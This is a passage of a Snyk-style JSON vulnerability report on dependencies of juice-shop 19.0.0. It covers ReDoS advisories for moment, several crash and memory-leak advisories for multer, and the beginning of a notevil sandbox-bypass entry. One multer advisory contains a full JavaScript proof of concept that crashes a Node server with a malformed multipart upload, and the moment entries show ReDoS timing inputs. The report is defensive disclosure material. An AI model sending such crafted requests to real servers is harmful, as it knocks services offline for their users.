            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.9,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:33.950105Z"
          }
        ],
        "description": "## Overview\r\n[`moment`](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\r\n\r\nAffected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks for any locale that has separate format and standalone options and `format` input can be controlled by the user.\r\n\r\nAn attacker can provide a specially crafted input to the `format` function, which nearly matches the pattern being matched. This will cause the regular expression matching to take a long time, all the while occupying the event loop and preventing it from processing other requests and making the server unavailable (a Denial of Service attack).\r\n\r\n## Disclosure Timeline\r\n- October 19th, 2016 - Reported the issue to package owner.\r\n- October 19th, 2016 - Issue acknowledged by package owner.\r\n- October 24th, 2016 - Issue fixed and version `2.15.2` released.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## References\r\n- [Proof of concept](https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc)\r\n- [Fix commit](https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-400"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-MOMENT-10164",
            "SNYK-JS-MOMENT-10164",
            "npm:moment:20161019"
          ]
        },
        "packageName": "moment",
        "proprietary": true,
        "creationTime": "2016-10-23T06:57:59.675000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-MOMENT-10164"
        ],
        "disclosureTime": "2016-10-18T21:00:00Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2016-10-24T06:57:59Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:33.950105Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "moment@2.0.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "moment",
        "version": "2.0.0"
      },
      {
        "id": "npm:moment:20170905",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "credit": [
          "Cristian-Alexandru Staicu"
        ],
        "semver": {
          "vulnerable": [
            "<2.19.3"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.19.3"
        ],
        "patches": [
          {
            "id": "patch:npm:moment:20170905:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/moment/20170905/moment_0_0_69ed9d44957fa6ab12b73d2ae29d286a857b80eb.patch"
            ],
            "version": "<2.19.3 >=2.16.0",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.878422Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "low",
        "cvssScore": 3.7,
        "functions": [
          {
            "version": [
              "<2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "className": null,
              "functionName": "monthsShortRegex"
            }
          },
          {
            "version": [
              "<2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "className": null,
              "functionName": "monthsRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "className": null,
              "functionName": "weekdaysRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "className": null,
              "functionName": "weekdaysShortRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "className": null,
              "functionName": "weekdaysMinRegex"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "moment",
        "references": [
          {
            "url": "https://github.com/moment/moment/issues/4163",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/moment/moment/pull/4326",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:47:06.964108Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:54:00.699882Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:55:28.905051Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:06.964108Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:54:00.699882Z"
          }
        ],
        "description": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`/[0-9]*['a-z\\u00A0-\\u05FF\\u0700-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF]+|[\\u0600-\\u06FF\\/]+(\\s*?[\\u0600-\\u06FF]+){1,2}/i`) in order to parse dates specified as strings. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `moment` to version 2.19.3 or higher.\n## References\n- [GitHub Issue](https://github.com/moment/moment/issues/4163)\n- [GitHub PR](https://github.com/moment/moment/pull/4326)\n",
        "epssDetails": {
          "percentile": "0.47749",
          "probability": "0.00243",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2017-18214"
          ],
          "CWE": [
            "CWE-400"
          ],
          "NSP": [
            "532"
          ],
          "GHSA": [
            "GHSA-446m-mv8f-q348"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-MOMENT-10841",
            "npm:moment:20170905"
          ]
        },
        "packageName": "moment",
        "proprietary": false,
        "creationTime": "2017-09-13T07:55:05.106000Z",
        "functions_new": [
          {
            "version": [
              "<2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "functionName": "monthsShortRegex"
            }
          },
          {
            "version": [
              "<2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "functionName": "monthsRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "functionName": "weekdaysRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "functionName": "weekdaysShortRegex"
            }
          },
          {
            "version": [
              ">=2.13.0 <2.19.3"
            ],
            "functionId": {
              "filePath": "moment.js",
              "functionName": "weekdaysMinRegex"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-MOMENT-10841"
        ],
        "disclosureTime": "2017-09-05T21:00:00Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2017-11-28T14:47:22Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:54:00.699882Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "moment@2.0.0"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "moment",
        "version": "2.0.0"
      },
      {
        "id": "SNYK-JS-MULTER-10185673",
        "title": "Uncaught Exception",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Max Mathieu"
        ],
        "semver": {
          "vulnerable": [
            "<2.0.0"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "2.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "multer",
        "references": [
          {
            "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/expressjs/multer/issues/1176",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-20T14:50:49.594750Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-20T14:50:49.594750Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception due to an `error` event thrown by `busboy`. An attacker can cause a full nodejs application to crash by sending a specially crafted multi-part upload request.\n## PoC\n```javascript\r\nconst express = require('express')\r\nconst multer  = require('multer')\r\nconst http  = require('http')\r\nconst upload = multer({ dest: 'uploads/' })\r\nconst port = 8888\r\n\r\nconst app = express()\r\n\r\napp.post('/upload', upload.single('file'), function (req, res) {\r\n  res.send({})\r\n})\r\n\r\napp.listen(port, () => {\r\n  console.log(`Listening on port ${port}`)\r\n\r\n  const boundary = 'AaB03x'\r\n  const body = [\r\n    '--' + boundary,\r\n    'Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"',\r\n    'Content-Type: text/plain',\r\n    '',\r\n    'test without end boundary'\r\n  ].join('\\r\\n')\r\n  const options = {\r\n    hostname: 'localhost',\r\n    port,\r\n    path: '/upload',\r\n    method: 'POST',\r\n    headers: {\r\n      'content-type': 'multipart/form-data; boundary=' + boundary,\r\n      'content-length': body.length,\r\n    }\r\n  }\r\n  const req = http.request(options, (res) => {\r\n    console.log(res.statusCode)\r\n  })\r\n  req.on('error', (err) => {\r\n    console.error(err)\r\n  })\r\n  req.write(body)\r\n  req.end()\r\n})\r\n```\n## Remediation\nUpgrade `multer` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)\n- [GitHub Issue](https://github.com/expressjs/multer/issues/1176)\n",
        "epssDetails": {
          "percentile": "0.10461",
          "probability": "0.00037",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-47944"
          ],
          "CWE": [
            "CWE-248"
          ],
          "GHSA": [
            "GHSA-4pg4-qvpc-4q3h"
          ]
        },
        "packageName": "multer",
        "proprietary": false,
        "creationTime": "2025-05-20T06:59:06.612966Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-05-19T22:16:30Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-20T14:50:49.586509Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-20T14:50:49.594750Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "multer@1.4.5-lts.2"
        ],
        "upgradePath": [
          false,
          "multer@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "multer",
        "version": "1.4.5-lts.2"
      },
      {
        "id": "SNYK-JS-MULTER-10185675",
        "title": "Missing Release of Memory after Effective Lifetime",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "UnlimitedBytes"
        ],
        "semver": {
          "vulnerable": [
            "<2.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "multer",
        "references": [
          {
            "url": "https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/expressjs/multer/pull/1120",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-20T13:48:08.461777Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-20T13:48:08.461777Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Missing Release of Memory after Effective Lifetime due to improper handling of error events in HTTP request streams, which fails to close the internal `busboy` stream. An attacker can cause a denial of service by repeatedly triggering errors in file upload streams, leading to resource exhaustion and memory leaks.\r\n\r\n**Note:**\r\n\r\nThis is only exploitable if the server is handling file uploads.\n## Remediation\nUpgrade `multer` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665)\n- [GitHub PR](https://github.com/expressjs/multer/pull/1120)\n",
        "epssDetails": {
          "percentile": "0.10461",
          "probability": "0.00037",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-47935"
          ],
          "CWE": [
            "CWE-401"
          ],
          "GHSA": [
            "GHSA-44fp-w29j-9vj5"
          ]
        },
        "packageName": "multer",
        "proprietary": false,
        "creationTime": "2025-05-20T07:17:52.523621Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-05-19T22:04:17Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-20T13:48:08.453751Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-20T13:48:08.461777Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "multer@1.4.5-lts.2"
        ],
        "upgradePath": [
          false,
          "multer@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "multer",
        "version": "1.4.5-lts.2"
      },
      {
        "id": "SNYK-JS-MULTER-10299078",
        "title": "Uncaught Exception",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H",
        "credit": [
          "Davit Vardanyan"
        ],
        "semver": {
          "vulnerable": [
            "<2.0.1"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.0.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "multer",
        "references": [
          {
            "url": "https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/expressjs/multer/issues/1233",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/expressjs/multer/pull/1256",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.2,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-04T14:52:32.637132Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.6,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-04T14:52:32.637132Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception in `makeMiddleware`, when processing a file upload request. An attacker can cause the application to crash by sending a request with a field name containing an empty string.\n## Remediation\nUpgrade `multer` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9)\n- [GitHub Issue](https://github.com/expressjs/multer/issues/1233)\n- [GitHub PR](https://github.com/expressjs/multer/pull/1256)\n",
        "epssDetails": {
          "percentile": "0.20113",
          "probability": "0.00063",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-48997"
          ],
          "CWE": [
            "CWE-248"
          ],
          "GHSA": [
            "GHSA-g5hg-p3ph-g8qg"
          ]
        },
        "packageName": "multer",
        "proprietary": false,
        "creationTime": "2025-06-04T07:00:55.886197Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-06-03T18:43:39Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-06-04T14:52:32.618949Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-04T14:52:32.637132Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "juice-shop@19.0.0",
          "multer@1.4.5-lts.2"
        ],
        "upgradePath": [
          false,
          "multer@2.0.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "multer",
        "version": "1.4.5-lts.2"
      },
      {
        "id": "SNYK-JS-MULTER-10773732",
        "title": "Uncaught Exception",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "Ulises Gascón"
        ],
        "semver": {
          "vulnerable": [
            ">=1.4.4-lts.1 <2.0.2"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "2.0.2"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "multer",
        "references": [
          {
            "url": "https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b",
            "title": "GitHub Commit"
          },
          {
            "url": "https://cna.openjsf.org/security-advisories.html",
            "title": "OpenJS Advisories"
          },
          {
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2381726",
            "title": "Red Hat Bugzilla Bug"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "4.0",
            "modificationTime": "2025-07-18T07:25:12.716596Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2025-07-18T07:25:12.716596Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncaught Exception due to improper handling of multipart requests. An attacker can cause the application to crash by sending a specially crafted malformed multi-part upload request that triggers an unhandled exception.\n## Remediation\nUpgrade `multer` to version 2.0.2 or higher.\n## References\n- [GitHub Commit](https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b)\n- [OpenJS Advisories](https://cna.openjsf.org/security-advisories.html)\n- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2381726)\n",
        "epssDetails": {
          "percentile": "0.03368",
          "probability": "0.00018",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-7338"
          ],
          "CWE": [
            "CWE-248"
          ],
          "GHSA": [
            "GHSA-fjgf-rc76-4x9p"
          ]
        },
        "packageName": "multer",
        "proprietary": false,
        "creationTime": "2025-07-18T07:16:18.824948Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-07-17T21:01:54Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-07-18T07:16:19.192565Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-07-18T07:25:12.716596Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "multer@1.4.5-lts.2"
        ],
        "upgradePath": [
          false,
          "multer@2.0.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "multer",
        "version": "1.4.5-lts.2"
      },
      {
        "id": "SNYK-JS-NOTEVIL-2385946",
        "title": "Sandbox Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
        "credit": [
          "Cristian-Alexandru Staicu",
          "Abdullah Alhamdan"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "notevil",
        "references": [],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-11T09:49:30.708028Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.5,
